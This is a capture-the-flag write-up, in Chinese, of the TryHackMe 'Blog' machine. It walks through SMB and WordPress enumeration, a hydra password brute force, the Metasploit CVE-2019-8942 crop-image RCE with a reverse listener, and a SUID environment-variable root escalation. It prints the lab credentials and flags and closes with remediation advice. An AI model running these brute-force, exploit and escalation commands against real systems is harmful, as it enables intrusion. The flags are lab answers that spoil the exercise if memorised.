# THM Blog 渗透测试详细 Writeup (2026-06-04)

**目标**: 10.49.177.221 - TryHackMe 靶场 (Blog)
**主机名**: blog.thm
**授权**: THM 授权靶场，全 IP 范围，无限制
**总耗时**: ~45 分钟
**测试者**: yao
**日期**: 2026-06-04

---

## 1. 信息搜集 (Reconnaissance)

### 1.1 初始端口扫描

使用 Nmap 进行初步端口和服务识别：

```bash
nmap -sV -sC -O 10.49.177.221
```

**扫描结果**:
- **22/tcp**: SSH - OpenSSH
- **80/tcp**: HTTP - Apache httpd 2.4.29 (Ubuntu)
- **139/tcp**: netbios-ssn - Samba
- **445/tcp**: microsoft-ds - Samba
- 4 个 filtered 端口: 42212, 49270, 55101, 60254

### 1.2 主机名确认

- **blog.thm** - 暗示博客系统
- 主机可达: ping 0% 丢包, ttl=62

---

## 2. SMB 枚举

### 2.1 共享发现

使用 smbclient 枚举共享：

```bash
smbclient -L //10.49.177.221 -N
```

**发现共享**:
- **BillySMB** - Billy's local SMB Share (可匿名访问)
- print$ - Printer Drivers (拒绝访问)
- IPC$ - IPC Service

### 2.2 文件下载

连接 BillySMB 共享并下载文件：

```bash
smbclient //10.49.177.221/BillySMB -N
```

**文件列表**:
1. **Alice-White-Rabbit.jpg** (33,378 bytes) - 图片文件
2. **tswift.mp4** (1,236,733 bytes) - 视频文件
3. **check-this.png** (3,082 bytes) - 图片文件

### 2.3 文件分析

**check-this.png**:
- 使用 `zbarimg` 扫描发现是 QR 二维码
- QR 内容: `https://qrgo.page.link/M6dE`
- 链接无效/被阻止

**Alice-White-Rabbit.jpg & tswift.mp4**:
- 提示 "Billy has some weird things going on his laptop"
- 暗示可能存在隐写术 (Steganography)
- 待进一步分析

---

## 3. Web 枚举

### 3.1 目录扫描

使用 gobuster 进行目录枚举：

```bash
gobuster dir -u http://10.49.177.221 -w /usr/share/wordlists/dirb/common.txt -t 50
```

**关键发现**:
- `/wp-admin` (301) - WordPress 管理后台
- `/wp-content` (301) - WordPress 内容目录
- `/wp-includes` (301) - WordPress 核心文件
- `/admin` (302) - 重定向到登录
- `/dashboard` (302) - 重定向到登录
- `/login` (302) - 登录页面
- `/robots.txt` (200) - 可访问

### 3.2 WordPress 识别

**确认 CMS**: WordPress 5.0
- 版本发布日期: 2018-12-06 (不安全版本)
- RSS feed: `<generator>https://wordpress.org/?v=5.0</generator>`
- 主题: Twenty Twenty v1.3 (过时)
- 网站标题: "Billy Joel's IT Blog"

### 3.3 用户枚举

使用 wpscan 枚举 WordPress 用户：

```bash
wpscan --url http://blog.thm --no-update --enumerate u
```

**发现用户**:
- **bjoel** (Billy Joel) - 作者
- **kwheel** (Karen Wheeler) - 作者

---

## 4. 初始访问 (Initial Access)

### 4.1 密码爆破

使用 hydra 对 WordPress 登录进行暴力破解：

**错误尝试** (匹配条件错误):
```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=Invalid+username" -t 50
```
- 错误: 使用 `F=Invalid+username` 导致大量误报
- 结果: 50 个"有效"密码 (实际都是误报)

**正确尝试**:
```bash
# 首先确认错误信息格式
curl -s -X POST http://blog.thm/wp-login.php -d "log=kwheel&pwd=wrongpassword&wp-submit=Log+In" | grep -i "error\|password\|dashboard" | head -3
# 返回: "The password you entered for the username kwheel is incorrect"

# 使用正确的匹配条件
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:S=Dashboard" -t 50
```

**成功获取凭据**:
- **用户名**: kwheel (Karen Wheeler)
- **密码**: `cutiepie1`

### 4.2 漏洞利用

使用 Metasploit 的 WordPress Crop-image RCE 漏洞：

```bash
msfconsole
search CVE-2019-8942
use exploit/multi/http/wp_crop_rce
```

**模块配置**:
```bash
set RHOSTS blog.thm
set RPORT 80
set TARGETURI /
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST 192.168.241.203
set LPORT 4444
exploit
```

**利用成功**:
- 获取 Meterpreter session
- 用户: www-data (uid=33)
- 路径: /var/www/wordpress

### 4.3 Shell 升级

升级基本 shell 为交互式 bash：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. 权限提升 (Privilege Escalation)

### 5.1 SUID 文件枚举

查找系统上的 SUID 文件：

```bash
find / -perm -u=s -type f 2>/dev/null
```

**关键发现**:
```
/usr/sbin/checker
```

这是一个自定义 SUID 文件，不属于标准系统文件。

### 5.2 分析 checker 文件

使用 strings 分析二进制文件：

```bash
strings /usr/sbin/checker | head -30
```

**发现关键字符串**:
- `getenv` - 获取环境变量
- `admin` - 环境变量名称
- `setuid` - 设置用户 ID
- `system("/bin/bash")` - 启动 bash
- `puts("Not an Admin")` - 错误信息

**分析结论**:
- checker 检查环境变量 `admin` 是否存在
- 如果存在，调用 setuid 提升权限，然后启动 /bin/bash
- 如果不存在，输出 "Not an Admin"

### 5.3 利用环境变量提权

设置环境变量并执行 checker：

```bash
export admin=1
/usr/sbin/checker
```

**提权成功**:
- 获取 root shell
- 提示符变为: `root@blog:/home/bjoel#`

---

## 6. Flag 获取

### 6.1 干扰信息

在 `/home/bjoel/user.txt` 发现干扰信息：
```
You won't find what you're looking for here.
TRY HARDER
```

### 6.2 真正的 User Flag

在 `/media/usb/user.txt` 发现真正的 user flag：

```bash
cat /media/usb/user.txt
# c8421899aae571f7af486492b71a8ab7
```

**User Flag**: `c8421899aae571f7af486492b71a8ab7`

### 6.3 Root Flag

在 `/root/root.txt` 发现 root flag：

```bash
cat /root/root.txt
# 9a0b2b618bef9bfa7ac28c1353d9f318
```

**Root Flag**: `9a0b2b618bef9bfa7ac28c1353d9f318`

---

## 7. 攻击路径总结

```
信息搜集
  → Nmap 扫描 (22/80/139/445)
  → SMB 枚举 → BillySMB 共享 (3 个文件)
  → Web 枚举 → WordPress 5.0 识别

初始访问
  → WordPress 用户枚举 (bjoel, kwheel)
  → Hydra 密码爆破 → kwheel:cutiepie1
  → MSF wp_crop_rce (CVE-2019-8942)
  → 获取 www-data shell
  → Shell 升级 (python3 pty)

权限提升
  → SUID 枚举 → /usr/sbin/checker
  → 分析发现 getenv("admin") + setuid + system("/bin/bash")
  → 设置环境变量 admin=1
  → 执行 checker → root shell

Flag 获取
  → 干扰: /home/bjoel/user.txt (TRY HARDER)
  → User Flag: /media/usb/user.txt
  → Root Flag: /root/root.txt
```

---

## 8. 关键技术点

### 8.1 WordPress 5.0 Crop-image RCE (CVE-2019-8942)
- **影响版本**: WordPress 5.0.0
- **漏洞类型**: 图片裁剪功能导致的远程代码执行
- **利用条件**: 需要有效的 WordPress 账户
- **MSF 模块**: `exploit/multi/http/wp_crop_rce`

### 8.2 Hydra 密码爆破技巧
- **错误匹配**: `F=Invalid+username` 导致误报
- **正确匹配**: `S=Dashboard` 确认登录成功
- **错误信息分析**: 先手动测试确认错误页面内容

### 8.3 SUID + 环境变量提权
- **自定义 SUID 二进制**: `/usr/sbin/checker`
- **漏洞原理**: 程序检查环境变量 `admin`，如果存在则提升权限
- **利用方法**: `export admin=1; /usr/sbin/checker`
- **安全教训**: 不要在 SUID 程序中依赖环境变量做权限检查

### 8.4 干扰信息识别
- `/home/bjoel/user.txt` 包含假 flag
- 真正的 flag 在 `/media/usb/user.txt`
- 需要全面搜索系统，不要只检查默认位置

---

## 9. 修复建议

### 9.1 WordPress 安全
- **升级 WordPress**: 升级到最新版本
- **启用强密码策略**: 防止密码爆破
- **限制登录尝试**: 实施账户锁定机制
- **使用 Web 应用防火墙**: 过滤恶意请求

### 9.2 SMB 安全
- **禁用匿名访问**: 不要允许空密码连接
- **审计共享内容**: 不要共享敏感文件
- **移除不必要的共享**: 如 BillySMB

### 9.3 权限提升防护
- **移除自定义 SUID**: `chmod u-s /usr/sbin/checker`
- **审计 SUID 文件**: 定期检查系统中的 SUID 文件
- **安全编码**: 不要在 SUID 程序中使用环境变量做权限控制
- **最小权限原则**: 不要给不必要的文件 SUID 权限

## 10. 靶机状态

- **状态**: ✅ 全部完成
- **获取 Flags**: 2/2 (user.txt + root.txt)
- **总耗时**: ~45 分钟
- **初始访问**: WordPress CVE-2019-8942 (MSF)
- **权限提升**: SUID + 环境变量 (checker)
